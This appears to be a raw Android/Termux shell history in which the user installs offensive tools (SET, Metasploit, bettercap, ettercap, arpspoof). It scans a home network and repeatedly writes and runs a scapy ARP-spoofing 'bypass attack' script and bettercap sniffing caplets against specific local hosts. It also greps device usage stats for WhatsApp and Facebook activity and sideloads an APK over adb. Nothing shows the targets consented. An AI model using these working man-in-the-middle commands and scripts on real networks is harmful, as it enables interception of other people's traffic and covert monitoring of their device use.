apt update && apt upgrade -y
apt install sudo wget curl git nano net-tools iputils-ping -y
git clone --depth 1 https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
cd setoolkit
pip3 install -r requirements.txt
python3 setup.py install
apt update && apt upgrade
apt install rust binutils python-dev-is-python3 libffi-dev openssl-dev
pip install --upgrade pip setuptools wheel
pip install cryptography
apt install python3-cryptography
apt install libssl-dev libffi-dev python3-dev
pip install --upgrade setuptools pip
pip install cryptography --prefer-binary
pkg install rust binutils python-cryptography -y
apt install rustc binutils python3-cryptography -y
setoolkit
metasploit
exit
metasploit
msfvenom
iconfig
iface wlan0
-iface wlan0
iface - wlan0
bettercap -iface wlan0
exit
apt install bettercap -y
bettercap -iface wlan0
ip addr
pkg list-all | grep -i tool
pkg install tur-repo
apt install tur-repo
exit
pkg update && pkg upgrade
apt update && apt upgrade
apt install ettercap
apt install ettercap-text-only
apt update
apt install net-tools iproute2 -y
ip addr
ifconfig
clear
ifconfig
hostname -I
cat /proc/net/fib_trie | grep host | grep -v 127.0.0.1
echo 1 > /proc/sys/net/ipv4/ip_forward
clear
exit
ettercap -T -q -i wlan0 -p
ettercap -T -q -p -z -i wlan0
clear
ettercap -T -q -i wlan0 -M arp:remote -u /192.168.0.21// /192.168.0.1//
arpspoof -i wlan0 -t 192.168.0.21 192.168.0.1
clear
python3 attack.py
nmap -sn --unprivileged 192.168.0.0/24
cat <<EOF > attack.py
from scapy.all import *
import time

target_ip = "192.168.0.21"
gateway_ip = "192.168.0.1"

def spoof(target, host):
    packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
    send(packet, verbose=False)

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

python3 attack.py
cat <<EOF > attack.py
from scapy.all import *
import time

target_ip = "192.168.0.24"
gateway_ip = "192.168.0.1"

def spoof(target, host):
    packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
    send(packet, verbose=False)

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

python3 attack.py
nano attack.py
python3 attack.py
rm -f attack.py*
rm -rf__pycache__
rm -rf_pycache_
rm -rf __pycache__
nmap -sn --unprivileged 192.168.0.0/24
from scapy.all import *
import time
# YOUR CONFIG
target_ip = "192.168.0.24"
gateway_ip = "192.168.0.1"
iface = "wlan0"
def spoof(target, host):
print("Starting bypass attack... Press CTRL+C to stop.")
try:
except KeyboardInterrupt:
nano attack.py
python3 attack.py
nmap -sn --unprivileged 192.168.0.0/24
nano attack.py
python3 attack.py
cat <<EOF > attack.py
import os
# This line tells Scapy NOT to look at the hardware automatically
os.environ["SCAPY_USE_VDE"] = "1"

from scapy.all import *
import time

# Manual socket override
conf.L3socket = L3RawSocket

target_ip = "192.168.0.24"
gateway_ip = "192.168.0.1"
interface = "wlan0"

def spoof(target, host):
    try:
        # We manually build the packet to avoid system checks
        packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
        send(packet, verbose=False, iface=interface)
    except Exception as e:
        # If it still complains, we ignore the system error and keep trying
        pass

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

nano attack.py
python3 attack.py
nmap -sn --unprivileged 192.168.0.0/24 
nano attack.py
python3 attack.py
rm -f attack.py*
nano attack.py
python3 attack.py
nano attack.py
python3 attack.py
apt update 
apt install nmap -y
nmap -sn 192.168.0.0/24
nmap -sn --unprivileged 192.168.0.0/24
lnmap -sn --unprivileged 192.168.0.0/24
nmap -sn --unprivileged 192.168.0.0/24
ettercap -T -q -i wlan0 -M arp:remote -u /192.168.0.21// /192.168.0.1//
nano /etc/ettercap/etter.conf
ettercap -T -o -q -i wlan0 -M arp:remote -u /192.168.0.21// /192.168.0.1//
apt install dsniff -y
arpspoof -i wlan0 -t 192.168.0.21 192.168.0.1
nmap -sn 192.168.0.0/24
nmap -sn --unprivileged 192.168.0.0/24
ettercap -T -q -p -z -i wlan0
apt update
apt install bettercap -y
bettercap -iface wlan0
bettercap -iface wlan0 -no-history -eval "net.probe on; ticker on"
echo "net.probe on" > attack.cap
echo "set arp.spoof.targets 192.168.0.21" >> attack.cap
echo "set arp.spoof.internal true" >> attack.cap
echo "arp.spoof on" >> attack.cap
echo "net.sniff on" >> attack.cap
echo "net.probe on" > attack.cap
echo "set arp.spoof.targets 192.168.0.21" >>
echo "set arp.spoof.targets 192.168.0.21" >> attack.cap
echo "set arp.spoof.internal true" >> attack.cap
echo "arp.spoof on" >> attack.cap
echo "net.sniff on" >> attack.cap
bettercap -iface wlan0 -caplet attack.cap
clear
apt update
apt install python3 python3-pip -y
pip install scapy --break-system-packages
nano attack.pyfrom scapy.all import *
python3 attack.py
nano attack.pyfrom scapy.all import *
python3 attack.py
cat <<EOF > attack.py
from scapy.all import *
import time

target_ip = "192.168.0.21"
gateway_ip = "192.168.0.1"

def spoof(target, host):
    packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
    send(packet, verbose=False)

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

python3 attack.py
cat <<EOF > attack.py
from scapy.all import *
import time

# Force Scapy to use a socket type that works in Termux/PRoot
conf.L3socket = L3RawSocket

target_ip = "192.168.0.21"
gateway_ip = "192.168.0.1"

def spoof(target, host):
    try:
        # We use send() with the L3 socket configuration
        packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
        send(packet, verbose=False)
    except Exception as e:
        print(f"Bypass active but hidden: {e}")

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

python3 attack.py
nano attack.py
python3 attack.py
rm -f attack.py*
cat <<EOF > attack.py
from scapy.all import *
import time

# Force Scapy to use a socket type that works in PRoot
conf.L3socket = L3RawSocket

target_ip = "192.168.0.21"
gateway_ip = "192.168.0.1"

def spoof(target, host):
    try:
        # Sends a fake ARP packet to redirect traffic
        packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
        send(packet, verbose=False)
    except Exception as e:
        print(f"Error: {e}")

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        # Tell Target I am the Router
        spoof(target_ip, gateway_ip)
        # Tell Router I am the Target
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

dumpsys usagestats > stats.txt
dumpsys usagestats | sed -n '/In-memory daily stats/,/In-memory weekly stats/p'
dumpsys usagestats daily | grep -E "package=com.whatsapp|package=com.facebook.katana" -A 4
pkg update && pkg upgrade
apt update && pkg upgrade
pkg install curl
apt install curl
curl -L https://raw.githubusercontent.com/RikkaApps/Shizuku-API/master/rish/rish.sh -o rish.sh
chmod +x rish.sh
./rish.sh
./rish
./rish -c "dumpsys usagestats daily" | grep -E "package=com.whatsapp|package=com.facebook.katana" -A 4
dumpsys usagestats > stats.txt
stats.txt
less stats.txt
dumpsys usagestats
dumpsys usagestats > stats.txt
less stats.txt
apt update && apt upgrade -y
apt install android-tools-adb -y
adb connect 192.168.0.23:37521
adb device
adb devices
adb connect 192.168.0.23:37521
adb connect192.168.0.23:37521
adb connect 192.168.0.23:37521
adb devices
clear
adb devices
adb shell
adb kill-server
exit
adb install -g /sdcard/Download/"PPSSPP GOLD.apk
adb install -g "/sdcard/Download/PPSSP GOLD.apk"
adb install -g "/sdcard/Download/PPSSP GOLD.apk"
exit
adb devices
adb shell
adb connect 192.168.0.23:37595
adb device
adb devices
adb shell
exit
rish -c "settings put global window_animation_scale 0.5"
adb connect 192.168.0.23:42715
adb devices
xit
exit
adb pair 192.168.0.23:40967
adb connect 192.168.0.23:40967
adb connect 192.168.0.23:37521
adb devices
adb install -g /Download/PPSSPP_GOLD.apk
termux-setup-storage
cd ~/storage/downloads
adb install -g /sdcard/Download/"PPSSPP GOLD.apk
pkg install proot-distro -y
exit
